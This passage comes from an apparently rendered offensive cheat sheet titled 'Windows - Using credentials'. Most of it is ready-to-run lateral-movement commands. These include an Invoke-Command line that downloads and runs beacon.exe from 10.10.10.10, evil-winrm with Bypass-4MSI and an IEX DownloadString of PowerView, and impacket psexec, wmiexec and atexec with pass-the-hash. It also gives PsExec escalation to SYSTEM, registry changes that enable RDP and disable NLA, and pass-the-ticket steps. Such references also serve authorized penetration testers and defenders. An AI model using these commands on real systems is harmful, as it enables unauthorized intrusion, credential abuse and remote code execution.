+</span></span><span style="display:flex;"><span>PS C:\&gt; New-PSSESSION -NAME PSDC -ComputerName COMPUTER01; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {whoami}
+</span></span><span style="display:flex;"><span>PS C:\&gt; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri <span style="color:#e6db74">&#39;http://10.10.10.10/beacon.exe&#39;</span> -OutFile <span style="color:#e6db74">&#39;C:\Temp\beacon.exe&#39;</span>; Start-Process -wait C:\Temp\beacon.exe}
+</span></span></code></pre></div><h2 id="winrm">
+  WinRM
+  <a class="anchor" href="#winrm">#</a>
+</h2>
+<p>Require:</p>
+<ul>
+<li>Port <strong>5985</strong> or <strong>5986</strong> open.</li>
+<li>Default endpoint is <strong>/wsman</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@payload$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/Hackplayers/evil-winrm
+</span></span><span style="display:flex;"><span>root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
+</span></span><span style="display:flex;"><span>root@payload$ ruby evil-winrm.rb -i <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -p <span style="color:#e6db74">&#39;MySuperSecr3tPass123!&#39;</span> -s <span style="color:#e6db74">&#39;/home/foo/ps1_scripts/&#39;</span> -e <span style="color:#e6db74">&#39;/home/foo/exe_files/&#39;</span>
+</span></span><span style="display:flex;"><span>root@payload$ ruby evil-winrm.rb -i <span style="color:#ae81ff">10.0</span>.0.20 -u username -H BD1C6503987F8FF006296118F359FA79
+</span></span><span style="display:flex;"><span>root@payload$ ruby evil-winrm.rb -i <span style="color:#ae81ff">10.0</span>.0.20 -u username -p password -r domain.local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS &gt; Bypass-4MSI
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS &gt; IEX([<span style="color:#66d9ef">Net.Webclient</span>]::new().DownloadString(<span style="color:#e6db74">&#34;http://127.0.0.1/PowerView.ps1&#34;</span>))
+</span></span></code></pre></div><p>or using a custom ruby code to interact with the WinRM service.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;winrm&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">WinRM</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Connection</span><span style="color:#f92672">.</span>new( 
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">endpoint</span>: <span style="color:#e6db74">&#39;http://ip:5985/wsman&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">user</span>: <span style="color:#e6db74">&#39;domain/user&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">password</span>: <span style="color:#e6db74">&#39;password&#39;</span>,
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>command<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>shell(<span style="color:#e6db74">:powershell</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>shell<span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">until</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;PS &gt; &#34;</span>
+</span></span><span style="display:flex;"><span>        command <span style="color:#f92672">=</span> gets        
+</span></span><span style="display:flex;"><span>        output <span style="color:#f92672">=</span> shell<span style="color:#f92672">.</span>run(command) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>stdout, stderr<span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">STDOUT</span><span style="color:#f92672">.</span>print stdout
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">STDERR</span><span style="color:#f92672">.</span>print stderr
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>    
+</span></span><span style="display:flex;"><span>    puts <span style="color:#e6db74">&#34;Exiting with code </span><span style="color:#e6db74">#{</span>output<span style="color:#f92672">.</span>exitcode<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><h2 id="powershell-remoting">
+  Powershell Remoting
+  <a class="anchor" href="#powershell-remoting">#</a>
+</h2>
+<blockquote>
+<p>PSSESSION</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS&gt; Enable-PSRemoting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># use credential</span>
+</span></span><span style="display:flex;"><span>PS&gt; $pass = ConvertTo-SecureString <span style="color:#e6db74">&#39;supersecurepassword&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS&gt; $cred = New-Object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#39;DOMAIN\Username&#39;</span>, $pass)
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one-to-one interactive session</span>
+</span></span><span style="display:flex;"><span>PS&gt; Enter-PSSession -computerName DC01
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">DC01</span>]<span style="color:#960050;background-color:#1e0010">:</span> PS&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one-to-one execute scripts and commands</span>
+</span></span><span style="display:flex;"><span>PS&gt; $Session = New-PSSession -ComputerName CLIENT1
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-Command -Session $Session -scriptBlock { $test = <span style="color:#ae81ff">1</span> }
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-Command -Session $Session -scriptBlock { $test }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># one-to-many execute scripts and commands</span>
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
+</span></span></code></pre></div><h2 id="winexe">
+  Winexe
+  <a class="anchor" href="#winexe">#</a>
+</h2>
+<p>Integrated to Kali</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@payload$ winexe -U DOMAIN/username<span style="color:#66d9ef">%</span>password //<span style="color:#ae81ff">10.10</span>.10.10 cmd.exe
+</span></span></code></pre></div><h2 id="wmi">
+  WMI
+  <a class="anchor" href="#wmi">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; wmic /node<span style="color:#960050;background-color:#1e0010">:</span>target.domain /user<span style="color:#960050;background-color:#1e0010">:</span>domain\user /password<span style="color:#960050;background-color:#1e0010">:</span>password <span style="color:#66d9ef">process</span> call create <span style="color:#e6db74">&#34;C:\Windows\System32\calc.exe”
+</span></span></span></code></pre></div><h2 id="psexecpy--smbexecpy--wmiexecpy">
+  Psexec.py / Smbexec.py / Wmiexec.py
+  <a class="anchor" href="#psexecpy--smbexecpy--wmiexecpy">#</a>
+</h2>
+<p>From 
+  <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> (:warning: renamed to impacket-xxx in Kali)
+:warning: <code>get</code> / <code>put</code> for wmiexec, psexec, smbexec, and dcomexec are changing to <code>lget</code> and <code>lput</code>. <br>
+:warning: French characters might not be correctly displayed on your output, use <code>-codec ibm850</code> to fix this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@payload$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/CoreSecurity/impacket.git
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PSEXEC like functionality example using RemComSv</span>
+</span></span><span style="display:flex;"><span>root@payload$ python psexec.py DOMAIN/username<span style="color:#960050;background-color:#1e0010">:</span>password@10.10.10.10
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># this will drop a binary on the disk = noisy</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># A similar approach to PSEXEC w/o using RemComSvc</span>
+</span></span><span style="display:flex;"><span>root@payload$ python smbexec.py DOMAIN/username<span style="color:#960050;background-color:#1e0010">:</span>password@10.10.10.10
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># A semi-interactive shell, used through Windows Management Instrumentation. </span>
+</span></span><span style="display:flex;"><span>root@payload$ python wmiexec.py DOMAIN/username<span style="color:#960050;background-color:#1e0010">:</span>password@10.10.10.10
+</span></span><span style="display:flex;"><span>root@payload$ wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee<span style="color:#960050;background-color:#1e0010">:</span>BD1C6503987F8FF006296118F359FA79
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. </span>
+</span></span><span style="display:flex;"><span>root@payload$ python atexec.py DOMAIN/username<span style="color:#960050;background-color:#1e0010">:</span>password@10.10.10.10
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</span>
+</span></span><span style="display:flex;"><span>root@payload$ python dcomexec.py DOMAIN/username<span style="color:#960050;background-color:#1e0010">:</span>password@10.10.10.10
+</span></span></code></pre></div><h2 id="psexec---sysinternal">
+  PsExec - Sysinternal
+  <a class="anchor" href="#psexec---sysinternal">#</a>
+</h2>
+<p>from Windows - 
+  <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternal</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># switch admin user to NT Authority/System</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
+</span></span></code></pre></div><h2 id="rdp-remote-desktop-protocol">
+  RDP Remote Desktop Protocol
+  <a class="anchor" href="#rdp-remote-desktop-protocol">#</a>
+</h2>
+<p>:warning: <strong>NOTE</strong>: You may need to enable RDP and disable NLA and fix CredSSP errors.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Enable RDP</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; reg add <span style="color:#e6db74">&#34;HKLM\System\CurrentControlSet\Control\Terminal Server&#34;</span> /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
+</span></span><span style="display:flex;"><span>PS C:\&gt; netsh firewall set service remoteadmin enable
+</span></span><span style="display:flex;"><span>PS C:\&gt; netsh firewall set service remotedesktop enable
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Alternative</span>
+</span></span><span style="display:flex;"><span>C:\&gt; psexec \\machinename reg add <span style="color:#e6db74">&#34;hklm\system\currentcontrolset\control\terminal server&#34;</span> /f /v fDenyTSConnections /t REG_DWORD /d <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>root@payload$ crackmapexec <span style="color:#ae81ff">192.168</span>.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fix CredSSP errors</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fDenyTSConnections /t REG_DWORD /d <span style="color:#ae81ff">0</span> /f
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> /v UserAuthentication /t REG_DWORD /d <span style="color:#ae81ff">0</span> /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable NLA</span>
+</span></span><span style="display:flex;"><span>PS &gt; (Get-WmiObject -class <span style="color:#e6db74">&#34;Win32_TSGeneralSetting&#34;</span> -Namespace root\cimv2\terminalservices -ComputerName <span style="color:#e6db74">&#34;PC01&#34;</span> -Filter <span style="color:#e6db74">&#34;TerminalName=&#39;RDP-tcp&#39;&#34;</span>).UserAuthenticationRequired
+</span></span><span style="display:flex;"><span>PS &gt; (Get-WmiObject -class <span style="color:#e6db74">&#34;Win32_TSGeneralSetting&#34;</span> -Namespace root\cimv2\terminalservices -ComputerName <span style="color:#e6db74">&#34;PC01&#34;</span> -Filter <span style="color:#e6db74">&#34;TerminalName=&#39;RDP-tcp&#39;&#34;</span>).SetUserAuthenticationRequired(<span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>Abuse RDP protocol to execute commands remotely with the following commands;</p>
+<ul>
+<li><code>rdesktop</code>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@payload$ rdesktop -d DOMAIN -u username -p password <span style="color:#ae81ff">10.10</span>.10.10 -g <span style="color:#ae81ff">70</span> -r disk<span style="color:#960050;background-color:#1e0010">:</span>share=/home/user/myshare
+</span></span><span style="display:flex;"><span>root@payload$ rdesktop -u username -p password -g <span style="color:#ae81ff">70</span>% -r disk<span style="color:#960050;background-color:#1e0010">:</span>share=/tmp/myshare <span style="color:#ae81ff">10.10</span>.10.10
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -g : the screen will take up 70% of your actual screen size</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -r disk:share : sharing a local folder during a remote desktop session </span>
+</span></span></code></pre></div></li>
+<li><code>freerdp</code>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@payload$ xfreerdp /v:<span style="color:#ae81ff">10.0</span>.0.1 /u:<span style="color:#e6db74">&#39;Username&#39;</span> /p:<span style="color:#e6db74">&#39;Password123!&#39;</span> +clipboard /cert-ignore /size<span style="color:#960050;background-color:#1e0010">:</span>1366x768 /smart-sizing
+</span></span><span style="display:flex;"><span>root@payload$ xfreerdp /v:<span style="color:#ae81ff">10.0</span>.0.1 /u:username <span style="color:#75715e"># password will be asked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pass the hash using Restricted Admin, need an admin account not in the &#34;Remote Desktop Users&#34; group.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pass the hash works for Server 2012 R2 / Win 8.1+</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11</span>
+</span></span><span style="display:flex;"><span>root@payload$ xfreerdp /v:<span style="color:#ae81ff">10.0</span>.0.1 /u:username /d:domain /pth<span style="color:#960050;background-color:#1e0010">:</span>88a405e17c0aa5debbc9b5679753939d  
+</span></span></code></pre></div></li>
+<li>
+  <a href="https://github.com/0xthirteen/SharpRDP">SharpRDP</a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; SharpRDP.exe computername=target.domain command=<span style="color:#e6db74">&#34;C:\Temp\file.exe&#34;</span> username=domain\user password=password
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="netuse">
+  Netuse
+  <a class="anchor" href="#netuse">#</a>
+</h2>
+<p>Windows only</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; net use \\ordws01.cscou.lab /user<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN\username password C$
+</span></span></code></pre></div><h2 id="runas">
+  Runas
+  <a class="anchor" href="#runas">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; runas /netonly /user<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN\username <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; runas /noprofil /netonly /user<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN\username cmd.exe
+</span></span></code></pre></div><h2 id="pass-the-ticket">
+  Pass the Ticket
+  <a class="anchor" href="#pass-the-ticket">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee<span style="color:#960050;background-color:#1e0010">:</span>B65039D1C0359FA797F88FF06296118F domain.local/user
+</span></span><span style="display:flex;"><span>[*] Saving ticket <span style="color:#66d9ef">in</span> user.ccache
+</span></span><span style="display:flex;"><span>cp user.ccache /tmp/krb5cc_0
+</span></span><span style="display:flex;"><span>export KRB5CCNAME=/tmp/krb5cc_0
+</span></span><span style="display:flex;"><span>klist
+</span></span></code></pre></div><h2 id="ssh">
+  SSH
+  <a class="anchor" href="#ssh">#</a>
+</h2>
+<p>:warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>cp user.ccache /tmp/krb5cc_1045
+</span></span><span style="display:flex;"><span>ssh -o GSSAPIAuthentication=yes user@domain.local -vv
+</span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">Ropnop - Using credentials to own Windows boxes</a></li>
+<li>
+  <a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/">Ropnop - Using credentials to own Windows boxes Part 2</a></li>
+<li>
+  <a href="https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html">Gaining Domain Admin from Outside Active Directory</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/windows_using_credentials.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#windows---using-credentials">Windows - Using credentials</a>
+      <ul>
+        <li><a href="#tips">TIPS</a>
+          <ul>
+            <li><a href="#tip-1---create-your-credential">TIP 1 - Create your credential</a></li>
+            <li><a href="#tip-2---retail-credential">TIP 2 - Retail Credential</a></li>
+            <li><a href="#tip-3---sandbox-credential---wdagutilityaccount">TIP 3 - Sandbox Credential - WDAGUtilityAccount</a></li>
+          </ul>
+        </li>
+        <li><a href="#metasploit">Metasploit</a>
+          <ul>
+            <li><a href="#metasploit---smb">Metasploit - SMB</a></li>
+            <li><a href="#metasploit---psexec">Metasploit - Psexec</a></li>
+          </ul>
+        </li>
+        <li><a href="#crackmapexec">Crackmapexec</a></li>
+        <li><a href="#remote-code-execution-with-ps-credentials">Remote Code Execution with PS Credentials</a></li>
+        <li><a href="#winrm">WinRM</a></li>
+        <li><a href="#powershell-remoting">Powershell Remoting</a></li>
+        <li><a href="#winexe">Winexe</a></li>
+        <li><a href="#wmi">WMI</a></li>
+        <li><a href="#psexecpy--smbexecpy--wmiexecpy">Psexec.py / Smbexec.py / Wmiexec.py</a></li>
+        <li><a href="#psexec---sysinternal">PsExec - Sysinternal</a></li>
+        <li><a href="#rdp-remote-desktop-protocol">RDP Remote Desktop Protocol</a></li>
+        <li><a href="#netuse">Netuse</a></li>
+        <li><a href="#runas">Runas</a></li>
+        <li><a href="#pass-the-ticket">Pass the Ticket</a></li>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
